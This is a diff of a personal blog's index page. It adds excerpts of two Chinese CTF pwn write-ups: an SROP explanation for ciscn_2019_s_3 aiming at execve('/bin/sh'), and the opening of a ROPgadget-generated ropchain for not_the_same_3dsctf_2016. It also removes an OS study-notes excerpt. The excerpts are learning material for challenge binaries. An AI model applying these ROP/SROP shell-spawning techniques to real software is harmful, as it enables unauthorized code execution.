@@ -134,6 +134,95 @@
     
     
     <div class="col-12 col-md-8 m-auto">
+      <a href="/2020/01/14/SROP-ciscn_2019_s_3/">
+        <p class="h4 index-header">SROP-ciscn_2019_s_3</p>
+        
+        
+          
+        
+        <div class="index-excerpt" >
+          <div class="index-text mb-1">SROP-ciscn_2019_s_3/es_7Sigreturn Oriented Programming (SROP) Attack攻击原理
+比较详细的WP
+https://www.jianshu.com/p/ca4a5dacd1a2
+
+两个系统调用，一个是sys_read，一个是sys_write，往栈上写数据（0x400），从栈上读数据（0x30），存在栈溢出。还有一个gadget函数。
+
+有两个值得注意的地方。mov rax,0fh 以及mov rax 59。这两个gadget控制了rax的值，看看这两个是什么系统调用。15 sys_rt_sigreturn59 sys_execve
+解法一59号系统调用是execve那么就可以想办法控制寄存器的值调用execve(“/bin/sh”,0,0)，注意在调用execve时，后面两个参数需要置0，由于需要控制rdx的值，所以选择使用通用gadget，__libc_csu_init。
+r13的值会给到rdx，让rbx=0，下面call的时候会变为call [r12]，会去call r12指向位置的代码，我们可以调到后面的rop执行，</div>
+        </div>
+      </a>
+
+      <div>
+        
+          <i class="iconfont icon-riqi2"></i>&nbsp;2020-01-14&nbsp;&nbsp;
+        
+        
+          <i class="iconfont icon-inbox"></i>
+          
+            <a href="/categories/CTF">CTF</a>&nbsp;
+          
+            <a href="/categories/%E5%A4%87%E5%BF%98">备忘</a>&nbsp;
+          
+            <a href="/categories/buu">buu</a>&nbsp;
+          &nbsp;
+        
+        
+      </div>
+    </div>
+  </div>
+
+  <div class="row mb-4 mx-auto">
+    
+    
+    <div class="col-12 col-md-8 m-auto">
+      <a href="/2020/01/13/ROPgadget-not_the_same_3dsctf_2016/">
+        <p class="h4 index-header">ROPgadget-not_the_same_3dsctf_2016</p>
+        
+        
+          
+        
+        <div class="index-excerpt" >
+          <div class="index-text mb-1">ROPgadget-not_the_same_3dsctf_2016
+
+ROPgadget --binary not_the_same_3dsctf_2016 --ropchain
+自动生成
+from struct import pack
+p = &#39;&#39;
+p += pack(&#39;&lt;I&#39;, 0x0806fcca) # pop edx ; ret
+p += pack(&#39;&lt;I&#39;, 0x080eb060) # @ .data
+p += pack(&#39;&lt;I&#39;, 0x08048b0b) # pop eax ; ret
+p += &#39;/bin&#39;
+p += pack(&#39;&lt;I&#39;, 0x0805586b) # mov dword ptr [edx], eax ; ret
+p += pack(&#39;&lt;I&#39;, 0x0806fcca) # pop edx ; ret
+p += pack(&#39;&lt;I&#39;, 0x080eb064) # @ .data + 4
+p += p</div>
+        </div>
+      </a>
+
+      <div>
+        
+          <i class="iconfont icon-riqi2"></i>&nbsp;2020-01-13&nbsp;&nbsp;
+        
+        
+          <i class="iconfont icon-inbox"></i>
+          
+            <a href="/categories/CTF">CTF</a>&nbsp;
+          
+            <a href="/categories/%E5%A4%87%E5%BF%98">备忘</a>&nbsp;
+          
+            <a href="/categories/buu">buu</a>&nbsp;
+          &nbsp;
+        
+        
+      </div>
+    </div>
+  </div>
+
+  <div class="row mb-4 mx-auto">
+    
+    
+    <div class="col-12 col-md-8 m-auto">
       <a href="/2020/01/11/Linux%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/">
         <p class="h4 index-header">Linux常见问题解决方法</p>
         
@@ -522,114 +611,11 @@ IP地址的低23位替换mac地址低</div>
     </div>
   </div>
 
-  <div class="row mb-4 mx-auto">
-    
-    
-    <div class="col-12 col-md-8 m-auto">
-      <a href="/2020/01/01/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0/">
-        <p class="h4 index-header">操作系统复习</p>
-        
-        
-          
-        
-        <div class="index-excerpt" >
-          <div class="index-text mb-1">对不起我看吐了，考炸了第一章操作系统的目标方便性，有效性，可扩充性和开放性
-可扩充性：采用微内核结构 P30
-发展主要动力
-不断提高计算机资源利用率
-方便用户
-器件的更新换代
-体系结构的发展
-新的应用需求
-
-多道程序设计的基本概念利用I/O操作的空闲时间，调度B程序运行，B空闲调度C等    P8
-优缺点
-资源利用率高
-吞吐量大
-平均周转时间长
-没有交互能力
-
-==操作系统定义为:一组能有效组织和管理硬件和软件资源，合理进行调度，方便用户使用程序的集合==
-分时系统（The Sharing System）在一台主机上连接多个终端，允许多个用户同时通过终端以交互方式使用计算机，共享主机资源
-特征
-多路性
-独立性
-及时性
-交互性
-
-基本特性有并发，共享，虚拟，异步四个基本特征
-并行与并发并行：多个程序同时执行
-并发：分时交替执行（为主）
-进程指在系统中可以独立运行并且是资源分配的基本单元
-共享互斥共享方式和同时访问方式
-虚拟（没有那么多但感觉有那么多）
-
-时分复用技术    （空闲时给其他用户服务
-空分复用技术    （储存器空闲时存储和运行程序
-
-异步（同时开始，不同时结束）
-进程以不可</div>
-        </div>
-      </a>
-
-      <div>
-        
-          <i class="iconfont icon-riqi2"></i>&nbsp;2020-01-01&nbsp;&nbsp;
-        
-        
-          <i class="iconfont icon-inbox"></i>
-          
-            <a href="/categories/%E4%B8%93%E4%B8%9A%E5%AD%A6%E4%B9%A0">专业学习</a>&nbsp;
-          &nbsp;
-        
-        
-          <i class="iconfont icon-tag"></i>
-          
-            <a href="/tags/%E4%B8%93%E4%B8%9A%E5%AD%A6%E4%B9%A0">专业学习</a>&nbsp;
-          
-        
-      </div>
-    </div>
-  </div>
-
-  <div class="row mb-4 mx-auto">
-    
-    
-    <div class="col-12 col-md-8 m-auto">
-      <a href="/2019/12/23/Pwn%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/">
-        <p class="h4 index-header">Pwn常用指令</p>
-        
-        
-          
-          
-        
-        <div class="index-excerpt" style="max-height: none;">
-          <div class="index-text mb-1">The article has been encrypted, please enter your password to view....</div>
-        </div>
-      </a>
-
-      <div>
-        
-          <i class="iconfont icon-riqi2"></i>&nbsp;2019-12-23&nbsp;&nbsp;
-        
-        
-          <i class="iconfont icon-inbox"></i>
-          
-            <a href="/categories/CTF">CTF</a>&nbsp;
-          
-            <a href="/categories/%E5%A4%87%E5%BF%98">备忘</a>&nbsp;
-          &nbsp;
-        
-        
-      </div>
-    </div>
-  </div>
-
 
 
   <nav aria-label="index posts navigation">
     <span class="pagination pg-blue justify-content-center mt-5" id="pagination">
-      <a class="extend prev" rel="prev" href="/"><i class="fas fa-angle-double-left"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/3/"><i class="fas fa-angle-double-right"></i></a>
+      <a class="extend prev" rel="prev" href="/"><i class="fas fa-angle-double-left"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/3/"><i class="fas fa-angle-double-right"></i></a>
     </span>
   </nav>
   
